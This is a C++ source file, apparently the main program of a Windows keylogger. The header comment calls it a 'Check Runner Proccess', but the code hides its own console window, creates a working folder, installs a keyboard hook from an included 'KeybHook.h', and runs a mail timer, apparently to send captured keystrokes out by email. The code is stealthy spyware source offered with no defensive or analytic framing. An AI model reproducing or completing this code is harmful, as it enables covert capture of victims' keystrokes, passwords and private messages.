/*
* C++ Check Runner Proccess with Name
* Author: walid Abbassi [https://github.com/walidAbbassi]
* 2019
*
*/

#include "pch.h"
#include "IO.h"
#include "KeybHook.h"

void hide();

int main()
{
	hide(); // set console window to appear for a instant
	MSG Msg; // msg object to be processed, but actually never is processed
	std::this_thread::sleep_for(std::chrono::minutes(1));
	IO::MKDir(IO::GetOurPath(true));
	while (true)
	{
		InstallHook();

		while (GetMessage(&Msg, NULL, 0, 0)) // empties console window
		{
			TranslateMessage(&Msg);
			DispatchMessage(&Msg);
		}

		MailTimer.Stop();
		std::this_thread::sleep_for(std::chrono::minutes(1));
	}
	return 0;
}

/*
*	window handler used to Hide output console window
*	@name	: hide
*	@param	: no param.
*	@return : void
*/
void hide()
{
	HWND stealth; // window handler used to hide the outputted console window
	AllocConsole();
	stealth = FindWindowA("ConsoleWindowClass", NULL);
	ShowWindow(stealth, 0);
}